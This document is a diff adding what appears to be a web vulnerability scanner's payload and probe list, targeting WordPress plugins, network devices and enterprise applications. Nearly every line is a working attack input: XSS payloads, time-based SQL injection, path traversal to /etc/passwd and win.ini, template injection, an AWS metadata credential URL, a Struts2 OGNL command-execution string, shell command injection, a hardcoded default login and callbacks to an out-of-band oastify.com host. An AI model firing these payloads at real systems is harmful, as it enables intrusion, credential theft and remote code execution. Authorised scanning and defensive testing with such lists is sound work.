@@ -1,0 +1,1136 @@
+<img+src%3dOnXSS+OnError%3dalert('AliElTop')>
+'; SELECT * FROM users; --
+<p onclick="this.innerText = getCode('AliElTop')">('AliElTop')</p>
+<a href="javascript:alert('AliElTop')">('AliElTop')</a>
+<a href="javascript:(function(){var page = document.createElement('html');page.innerHTML = '<head><title>AliElTop</title></head><body><h1>Hello AliElTop!</h1></body></html>';document.write('<!DOCTYPE html>' + page.outerHTML);})()">('AliElTop')</a>
+<script>alert('AliElTop');</script>
+<img src="invalid-image" onerror="alert('AliElTop')">
+<input type="text" value="AliElTop" onfocus="alert('AliElTop')">
+<svg/onload="alert('AliElTop')">
+<img src=x onerror="alert('AliElTop')">
+<head></head><body>padding<script>alert("AliElTop")</script>AliElTop</body>
+"<SVg/ONloAd=alert(13337777)>"@x.y
+"><svg/onload=prompt(/AliElTop/)>
+'"--!><img src=x onerror=alert("AliElTop")> 
+'"/><svg/onload=prompt(/AliElTop/)>
+'"><script>alert("AliElTop")</script>
+'"><script>confirm("AliElTop")</script>
+'"><script>prompt("AliElTop")</script>
+'"><svg/onload=alert(/AliElTop/)>
+'"><svg/onload=confirm(/AliElTop/)>
+'"><svg/onload=prompt(/AliElTop/)>
+'>"/><svg/onload=prompt(/AliElTop/)>
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<img  src="x:gif" onerror="window['al\u0065rt'](13337777)"></img>
+<svg/onload=prompt(/AliElTop/)>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("AliElTop")//>\x3exss.txt
+'"><svg/onload=prompt`13337777`>
+'"><svg/onload=alert`13337777`>
+'"><svg/onload=confirm`13337777`>
+'"><script>alert`13337777`</script> 
+><script>alert`13337777`</script> 
+'"><svg onload=prompt`AliElTop`>
+'"><svg onload=alert`AliElTop`>
+'"><svg onload=confirm`AliElTop`>
+<!'/*!"/*!/'/*/"/*--!><Input/Autofocus/*/Onfocus=confirm`AliElTop`//><Svg>/
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnQWxpRWxUb3AnKTwvc2NyaXB0Pg==">('AliElTop')</a>
+<img src=x onerror="alert('AliElTop');">
+<Svg Only=1 OnLoad="alert('AliElTop')">
+../../../../../../../../../../../../../../windows/win.ini
+;alert(md5('AliElTop'))
+{% For c in [1,2,3]%} {{c,c,c}} {% endfor %}
+{{4*4}}[[5*5]]
+%26ls||id%26
+/wp-admin/admin.php?page=p3dlite_materials&material_text="><script>alert(document.domain)</script>
+/wp-admin/admin.php?page=jj4t3-logs&a"><script>alert(13337777)</script>
+/
+/admin/
+/crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true
+/content/..;/crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true
+/bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User
+/wp-admin/admin.php?page=age-gate&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/login/
+/php/node_info.php
+/admin/index.php?page=home
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+/api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name
+/webtools/control/main
+/solr/admin/cores?wt=json
+https://api.airtable.com/v0/meta/bases
+https://otx.alienvault.com/api/v1/pulses/subscribed?page=1
+https://apiv2.bitcoinaverage.com/exchanges/ticker/bitstamp
+https://api.bitrise.io/v0.1/me
+https://blitapp.com/api/scheduledcapture
+https://api.blockchain.com/v3/exchange/accounts
+https://cardano-mainnet.blockfrost.io/api/v0/
+https://api.box.com/2.0/collections
+https://bravenewcoin.p.rapidapi.com/market
+https://person.clearbit.com/v2/combined/find?email=alex@clearbit.com
+https://api.clickup.com/api/v2/user
+https://api.clockify.me/api/v1/user
+https://api.cloudconvert.com/v2/tasks
+https://api.cloudflare.com/client/v4/user/tokens/verify
+https://rest.coinapi.io/v1/exchanges
+https://pro-api.coinmarketcap.com/v1/cryptocurrency/listings/latest
+https://api.coinranking.com/v2/exchanges
+https://api.craftmypdf.com/v1/list-templates?limit=300&offset=0
+https://api.digitalocean.com/v2/droplets
+https://app.flowdash.com/api/v1/workflows
+https://api2.frontapp.com/accounts
+https://gorest.co.in/public/v2/users
+https://api.iconfinder.com/v4/icons/search?query=arrow&count=10
+https://api.improvmx.com/v3/account
+https://api.jsonbin.io/v3/c
+https://app.launchdarkly.com/api/v2/members
+https://api.lob.com/v1/addresses
+https://scorecard.api.mywot.com/v3/targets?t=hbo.com&t=google.com
+https://networksdb.io/api/key
+https://api.newrelic.com/v2/applications.json
+https://bsc-blockbook.nownodes.io/api
+https://openpagerank.com/api/v1.0/getPageRank?domains[]=google.com
+https://api.pinata.cloud/data/pinList?status=pinned
+https://platform.quip.com/1/users/current
+https://api.scanii.com/v2.1/ping
+https://platform.segmentapis.com/v1beta/workspaces/myworkspace
+https://api.supportivekoala.com/v1/images
+https://api.tatum.io/v3/tatum/version
+https://api.todoist.com/rest/v1/projects
+https://urlscan.io/user/quotas/
+https://api.web3.storage/user/uploads
+/user
+/travel-detail.php?id=1%27AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(6)))bAKL)%20AND%20%27vRxe%27=%27vRxe
+/plug/oem/AspCms_OEMFun.asp
+https://identity.atechmedia.com/login
+/../../../../../../../../../../../../../etc/passwd
+/index.asp
+/pingmessages
+/camunda/app/welcome/default/
+/admin/index.php?page=categories
+/wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">--><script>alert(13337777)</script>
+/setup/eureka_info
+/webui
+/wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(13337777)</script>
+/public/index.php/home/file/user_pics
+/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=
+/images/logo/logo-eoffice.php
+/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+ipconfig
+/?lang=../../../../../usr/local/php/pearcmd
+/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d
+https://codepen.io/login
+/Server/CmxUser.php?pgid=UserList
+/db_dump.php
+
+/JavaScriptServlet
+/csz-cms/plugin/article/search?p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS
+/wp-admin/admin.php?page=wc-reports&a"><script>alert(13337777)</script>
+/index.php?sl=../../../../../../../etc/passwd%00
+/wp-content/plugins/advanced-text-widget/readme.txt
+/wp-content/plugins/advanced-text-widget/advancedtext.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/login-x.php
+/logs-x.php?jaction=view&fname=../../../../../etc/passwd
+/wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/etc/passwd
+/wp-content/plugins//wp-planet/readme.txt
+/wp-content/plugins/wp-planet/rss.class/scripts/magpie_debug.php?url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=1)+AND+(SELECT+1183+FROM+(SELECT(SLEEP(6)))UPad)+AND+(9752=9752&type=json
+/wp-admin/admin.php?where1=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&limitquery=1&searchsubmit=Buscar&page=nsp_search
+/wp-admin/admin.php?where1=<script>alert(document.domain)</script>&searchsubmit=Buscar&page=nsp_search
+/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/wp-admin/admin.php?groupby1=checked%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29&page=nsp_search&newstatpress_action=search
+/wp-admin/admin.php?page=i4t3-logs&orderby=(SELECT+*+FROM+(SELECT+SLEEP(7))XXX)--+-
+/?author=1
+/wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7422)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc
+/wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7421)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc
+/wp-admin/admin.php?page=BraftonArticleLoader&tab=alert%28document.domain%29
+/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd
+/BSW_cxttongr.htm
+_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=
+/index.php?c=weixin&m=sync&url=http://7fnerkk4ejqsa0874rxlxrtc73du1lpa.oastify.com
+/modules/profile/index.php?op=main&xoops_redirect=https:www.7fnerkk4ejqsa0874rxlxrtc73du1lpa.oastify.com
+/maint/modules/home/index.php?lang=english|cat%20/etc/passwd
+/maint/modules/home/index.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00english
+/wp-admin/admin.php?page=kbAmz&kbAction=demo%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/webadmin/pkg?command=<script>alert(document.cookie)</script>
+/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";
+/wp-admin/admin.php?page=bws_panel&category=%22%3E%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/wp-content/plugins/adsense-plugin/readme.txt
+/wp-content/plugins/contact-form-multi/readme.txt
+/wp-content/plugins/contact-form-plugin/readme.txt
+/wp-content/plugins/contact-form-to-db/readme.txt
+/wp-content/plugins/custom-admin-page/readme.txt
+/wp-content/plugins/custom-search-plugin/readme.txt
+/wp-content/plugins/htaccess/readme.txt
+/wp-content/plugins/social-buttons-pack/readme.txt
+/wp-content/plugins/social-login-bws/readme.txt
+/wp-content/plugins/subscriber/readme.txt
+/wp-content/plugins/twitter-plugin/readme.txt
+/wp-content/plugins/bws-linkedin/readme.txt
+/wp-content/plugins/bws-pinterest/readme.txt
+/wp-content/plugins/bws-smtp/readme.txt
+/wp-content/plugins/pagination/readme.txt
+/wp-content/plugins/pdf-print/readme.txt
+/wp-content/plugins/promobar/readme.txt
+/wp-content/plugins/rating-bws/readme.txt
+/wp-content/plugins/realty/readme.txt
+/wp-content/plugins/visitors-online/readme.txt
+/wp-content/plugins/zendesk-help-center/readme.txt
+/wp-content/plugins/bws-google-analytics/readme.txt
+/wp-content/plugins/bws-google-maps/readme.txt
+/wp-content/plugins/bws-testimonials/readme.txt
+/wp-content/plugins/error-log-viewer/readme.txt
+/wp-content/plugins/sender/readme.txt
+/wp-content/plugins/updater/readme.txt
+/wp-content/plugins/user-role/readme.txt
+/hw-sys.htm
+/__
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+/segments/
+/users/registration
+/session/language?last_page=session%2Flogin&language=en%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&login=&CipheredValue=
+/session/login
+\..\..\..\..\Windows\win.ini
+/fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27
+/manage/webshell/u?s=5&w=218&h=15&k=%73%65%72%76%69%63%65%0a%73%73%68%0a%64%69%73%61%62%6c%65%0a&l=62&_=5621298674064
+/manage/webshell/u?s=5&w=218&h=15&k=%0a&l=62&_=5621298674064
+/assets/edit/registrar-account.php?raid=hello%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&del=1
+/assets/edit/ip-address.php?ipid=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&del=1
+/wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date="><img+src%3Dx+onerror%3Dalert%28document.domain%29%3B%2F%2F&end_date&filter_action=Filter&paged=1&action2=-1
+/assets/account-owners.php
+/admin/ssl-fields/
+/assets/registrars.php
+/admin/dw/servers.php
+/assets/dns.php
+/assets/hosting.php
+/assets/ssl-providers.php
+/assets/ssl-accounts.php
+/assets/categories.php
+/cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/cs/Satellite?destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError
+/cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq"><script>alert(document.domain)</script>
+/cs/Satellite?pagename=OpenMarket%2FXcelerate%2FActions%2FSecurity%2FNoXceleditor&WemUI=qqq%27;}%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/cs/Satellite?pagename=OpenMarket%2FXcelerate%2FActions%2FSecurity%2FProcessLoginRequest&WemUI=qqq%27;}%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/assets/file:%2f%2f/etc/passwd
+//css//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows\win.ini
+/..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
+/config/pw_snmp.html
+/crowd/plugins/servlet/exp
+/login
+/wan.htm
+/custom/ajax_download.php?fileName=../../../../../../../../../etc/passwd
+/upload/scp/login.php
+/upload/scp/settings.php
+/wp-admin/admin.php?page=c4p-main&s=%22%3E%3Csvg/onload=alert(document.domain)%3E
+/reporting/domains/cost-by-month.php?daterange=%22onfocus=%22alert(document.domain)%22autofocus=%22
+/wp-admin/admin.php?page=photoblocks-edit&id=%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E
+/jnoj/web/polygon/problem/viewfile?id=1&name=../../../../../../../etc/passwd
+/?pum_action=tools_page_tab_system_info
+/test.txt
+/cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/WebReferences
+/cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/Slots
+/_async/favicon.ico
+/pages/createpage.action
+/plugins/3rdPartyServers/ox3rdPartyServers/max.class.php?0=id
+/index.php/login
+/wp-content/plugins/social-warfare/readme.txt
+/backupsettings.dat
+/wp-content/plugins/chopslider/get_script/index.php?id=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))A)
+/api/experimental/test
+/api/experimental/dags/example_trigger_target_dag/paused/false
+/login.php
+/devicemgmt.php?deviceId="><script>alert(document.domain)</script>
+/configDevice.php?rid="><script>alert(document.domain)</script>
+/?cda'"</script><script>alert(document.domain)</script>&locale=locale=de-DE
+/user/login
+/repo/create
+/fuel/login/
+/fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0
+/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
+/cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C
+/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc
+/zb_system/cmd.php?atc=login&redirect=http://www.7fnerkk4ejqsa0874rxlxrtc73du1lpa.oastify.com
+/user/login.php
+/_404_/%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E
+/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E
+/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E
+/admin/index.php?id=pages&action=add_page
+/wp-content/plugins/import-xml-feed/readme.txt
+/?p=1
+/cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=cat%20/etc/passwd
+/index.php?fc=module&module=productcomments&controller=CommentGrade&id_products%5B%5D=(select*from(select(sleep(6)))a)
+/setup.cgi?todo=debug&x=currentsetting.htm
+/tos/index.php?user/login
+/?username=zyfwp&password=PrOw!aN_fXp
+/ext-js/index.html
+/wp-admin/post.php?post=372&action=edit&sjb_file=../../../../etc/passwd
+/wp-content/plugins/quiz-master-next/README.md
+/wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php
+/index.php?module=users/login
+/ebook/bookPerPub.php?pubid=4'
+/magmi/web/info.php
+/index.php/catalogsearch/advanced/result/?name=e
+/PolicyMgmt/policyDetailsCard.do?poID=19&typeID=3&prodID=%27%22%3E%3Csvg%2fonload%3dalert(document.domain)%3E
+/menu/ss?sid=nsroot&username=nsroot&force_setup=1
+/menu/neo
+/menu/stc
+/menu/guiw?nsbrand=1&protocol=nonexistent.1337">&id=3&nsvpx=phpinfo
+/index.php?app=main&inc=core_auth&route=login
+/wp-admin/index.php
+/graph_realtime.php?action=init
+/images/..%2finfo.html
+/wp-admin/admin.php?page=mlw_quiz_list&s="></script><script>alert(document.domain)</script>&paged="></script><script>alert(document.domain)</script>
+/goform/goform_get_cmd_process?cmd=psw_fail_num_str
+/ui/vropspluginui/rest/services/getvcdetails
+/cgi-bin/cgiServer?worker=IndexNew
+/wp-admin/admin.php?page=backup_guard_backups
+/wp-admin/admin-ajax.php?client_id=1&redirect=https://7fnerkk4ejqsa0874rxlxrtc73du1lpa.oastify.com&action=nf_oauth_connect
+/wp-admin/admin.php?page=wc-order-export&tab=</script><script>alert(document.domain)</script>
+/wp-admin/options.php
+/wp-admin/options-general.php?page=moove-redirect-settings&tab=%22+style%3Danimation-name%3Arotation+onanimationstart%3D%22alert%28document.domain%29%3B
+/wp-admin/options-general.php?page=moove-taxonomy-settings&tab="+style=animation-name:rotation+onanimationstart="alert(document.domain);
+/wp-admin/edit.php?post_type=wcps&page=import_layouts&keyword="onmouseover%3Dalert%28document.domain%29%3B%2F%2F
+/wp-content/plugins/wp-statistics/readme.txt
+/wp-admin/admin.php?page=wps_pages_page&ID=0+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))test)&type=home
+/wp-admin/admin.php?page=sp-client-document-manager-fileview
+/?ct_mobile_keyword&ct_keyword&ct_city&ct_zipcode&search-listings=true&ct_price_from&ct_price_to&ct_beds_plus&ct_baths_plus&ct_sqft_from&ct_sqft_to&ct_lotsize_from&ct_lotsize_to&ct_year_from&ct_year_to&ct_community=%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&ct_mls&ct_brokerage=0&lat&lng
+/wp-admin/options-general.php?page=prismatic&tab=%22+style%3Danimation-name%3Arotation+onanimationend%3Dalert(document.domain)%2F%2F%22
+/wp-admin/admin.php?page=w3tc_extensions&extension="%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/wp-admin/admin.php?page=w3tc_extensions&extension='-alert(document.domain)-'
+/wp-admin/edit.php?post_type=post_grid&page=import_layouts&keyword="onmouseover=alert(document.domain)//
+/?cpmvc_id=1&cpmvc_do_action=mvparse&f=edit&month_index=0&delete=1&palette=0&paletteDefault=F00&calid=1&id=999&start=a%22%3E%3Csvg/%3E%3C%22&end=a%22%3E%3Csvg/onload=alert(13337777)%3E%3C%22
+/wp-admin/admin.php?page=mf_gig_calendar&action=edit&id="></script><script>alert(document.domain)</script><"
+/wp-admin/admin.php?page=wp_paytm_donation&action=delete&id=0%20AND%20(SELECT%205581%20FROM%20(SELECT(SLEEP(6)))Pjwy)
+/wp-content/plugins/pie-register/readme.txt
+/wp-admin/profile.php
+/wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(7)))HQYx)
+/wp-admin/admin.php?page=hfcm-list&orderby=%28SELECT+5619+FROM+%28SELECT%28SLEEP%286%29%29%29uWCv%29&order=DESC
+/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(6)
+/wp-content/plugins/wc-multivendor-marketplace/readme.txt
+/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20AND%20(SELECT%205921%20FROM%20(SELECT(SLEEP(6)))LxjM)%20AND%20(7754=775&type=json
+/wp-content/plugins/custom-registration-form-builder-with-submission-manager/admin/js/script_rm_utilities.js
+/wp-admin/edit.php?post_type=al_product&page=product-settings.php&ic-settings-search=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29%2F%2F
+/wp-admin/admin.php?page=domain-check-profile&domain=test.foo<script>alert(document.domain)</script>
+/wp-admin/admin.php?page=persian-wc&s=xxxxx%22+accesskey%3DX+onclick%3Dalert%281%29+test%3D%22
+/wp-admin/admin-ajax.php?action=mec_load_single_page&time=1))%20UNION%20SELECT%20sleep(6)%20--%20g
+/wp-admin/admin-ajax.php?action=rvm_import_regions&nonce=5&rvm_mbe_post_id=1&rvm_upload_regions_file_path=/etc/passwd
+/wp-admin/admin.php?page=blog2social&b2sShowByDate="><script>alert(document.domain)</script>
+/wp-admin/admin.php?page=all-in-one-video-gallery&tab=..%2F..%2F..%2F..%2F..%2Findex
+/wp-admin/admin.php?page=pmpro-discountcodes&s=s"+style=animation-name:rotation+onanimationstart=alert(document.domain)//
+/wp-admin/admin.php?page=wpo_wcpdf_options_page&section=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29+x%3D
+/wp-admin/admin.php?page=snippets&snippets-safe-mode%5B0%5D=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29+x%3D
+/wp-admin/admin.php?page=chaty-contact-form-feed&search=%3C%2Fscript%3E%3Cimg+src+onerror%3Dalert%28document.domain%29%3E
+/wp-admin/admin.php?page=feedwordpress%2Fsyndication.php&visibility=%22%3E%3Cimg+src%3D1+onerror%3Dalert%28document.domain%29%3E
+/wp-admin/admin.php?page=cf7skins&tab=%27%3E%3Cimg+src+onerror%3Dalert%28document.domain%29%3E
+/wp-admin/admin.php?page=cff-top&cff_access_token=xox%3C%2Fscript%3E%3Cimg+src+onerror%3Dalert(document.domain)%3E&cff_final_response=true
+/wp-admin/edit.php?post_type=ulpb_post&page=page-builder-new-landing-page&thisPostID=test"+style=animation-name:rotation+onanimationstart=alert(document.domain)+x=
+/wp-admin/admin.php?page=wpda_duplicate_post_menu
+/?wpam_id=1
+/wp-admin/admin.php?page=wpam-clicktracking
+/wp-admin/admin.php?page=vxcf_leads&form_id=cf_5&status&tab=entries&search&order=asc&orderby=file-438&field&time&start_date&end_date=onobw%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3Ez2u4g
+/wp-admin/?step=demo&page=owp_setup&a"><script>alert(/XSS/)</script>
+/wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E
+/?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g
+/wp-content/plugins/paid-memberships-pro/js/pmpro-checkout.js
+/wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=</script><script>alert(document.domain)</script>
+/nagiosxi/login.php
+/nagiosxi/index.php
+/nagiosxi/admin/sshterm.php?url=javascript:alert(document.domain)
+_DOC_ROOT_2021
+/dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml
+/misc.php?action=showpopups&type=friend
+/owa/auth/x.js
+/assets/app/something/services/AppModule.class/
+/log_download.cgi?type=../../etc/passwd
+/backup2.cgi
+/archive.php?from_time=2021-04-25&order_col=(SELECT+7397+FROM(SELECT(SLEEP(3)))test)&order_val=DESC&report_type=website-search-reports&search_name=&sec=viewWebsiteSearchSummary&to_time=2021-04-25&website_id=
+/dashboard.php
+/lib/ajaxHandlers/ajaxGetFileByPath.php?path=/etc/passwd
+/queues/"onmouseover="alert(document.domain)"
+/index.php?fc=module&module=productcomments&controller=CommentGrade&id_products[]=1%20AND%20(SELECT%203875%20FROM%20(SELECT(SLEEP(6)))xoOt)
+/appGet.cgi?hook=get_cfg_clientlist()
+/t/index.php?action[]=aaaa
+/status.htm
+/\u001B]8;;https://7fnerkk4ejqsa0874rxlxrtc73du1lpa.oastify.com"/onmouseover="alert(13337777)\u0007example\u001B]8;;\u0007
+/Assets/temp/hotspot/img/logohotspot.txt
+/wp-admin/options-general.php?page=customize-login-image/customize-login-image-options.php
+/wp-login.php
+/%u002e/WEB-INF/web.xml
+/.%00/WEB-INF/web.xml
+/wp-admin/
+//wp-admin/options-general.php/"></script><script>alert(document.domain)</script>/script%3E?page=securimage-wp-options%2F
+/wp-admin/options-general.php/</script><script>alert(document.domain)</script>/?page=skatubazar_option
+/bludit/admin/login
+/x
+%5B%27cmd%27%5D%29%29%0A++++++++%7B%0A++++++++++++system%28%24_
+/wfo/control/signin?rd=%2Fwfo%2Fcontrol%2Fmy_notifications%3FNEWUINAV%3D%22%3E%3Ch1%3ETest%3C%2Fh1%3E26
+/module/ph_simpleblog/list?sb_category=')%20OR%20true--%20-
+/module/ph_simpleblog/list?sb_category=')%20AND%20false--%20-
+/wp-admin/options-general.php?page=iq-block-country%2Flibs%2Fblockcountry-settings.php
+/dashboardUser
+/wp-admin/admin.php/"><script>alert(document.domain)</script>/?page=under-construction
+/wp-admin/admin.php/</script><script>alert(document.domain)</script>/?page=cnss_social_icon_page
+/wp-admin/admin.php?page=fv_player_stats&player_id=1</script><script>alert(document.domain)</script>
+/help/admin-guide/test.jsp
+/Modules.php?modname=miscellaneous%2fPortal.php..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&failed_login=
+/about/../tree?action=get
+/index.php
+/diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+var_dump(md5(\x27CVE-2021-41282\x27));unlink(__FILE__)\x3b\x3f\x3e/;w+/usr/local/www/test.php%0a%23
+/test.php
+/fmangersub?cpath=../../../../../../../etc/passwd
+/admin.php?p=entry&action=write
+/index.php/2022/10
+/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
+/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+/cgi-bin/slogin/login.py
+/views/index.php?msg=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/login.htm
+/formLoginAuth.htm?authCode=1&userName=admin&goURL=&action=login
+/dashboard/list/
+/STATE_ID/123/agentLogUploader
+/client/index.php
+/changePassword?username=administrator
+/api/blade-user/user-list
+/language/lang
+/services/pluginscript/
+/services/pluginscript/..;/..;/
+/admin/?page=user
+/admin/?page=mechanics
+/admin/?page=maintenance/category
+/admin/?page=maintenance/services
+/vehicle_service/admin/?page=user/list
+/archive/download?file=file:///etc/passwd
+/images/icons_title.gif
+/wp-admin/admin.php?page=wp-gdpr-compliance&x=%27+onanimationstart%3Dalert%28document.domain%29+style%3Danimation-name%3Arotation+x
+/wp-admin/admin.php?page=my-sticky-elements-leads&search-contact=xxxx%22%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29+x
+/wp-admin/admin.php?page=woo_ce&failed=1&message=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-admin/admin.php?page=nsp_search&what1=%27+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29+x
+/wp-admin
+/wp-admin/admin-post.php?action=csv_file&orderby=email%2c(select+*+from(select(sleep(7)))b)&order=desc
+/wp-admin/admin-ajax.php?action=woocs_get_products_price_html&woocs_in_order_currency=<img%20src%20onerror=alert(document.domain)>
+/?rest_route=/wc/v3/wishlist/remove_product/1&item_id=0%20union%20select%20sleep(7)%20--%20g
+/wp-admin/edit.php?post_type=ditty&page=ditty_settings&tab=%22%3E%3Cimg+src+onerror%3Dalert%28document.domain%29%3E
+/wp-admin/admin.php?page=e2pdf-settings
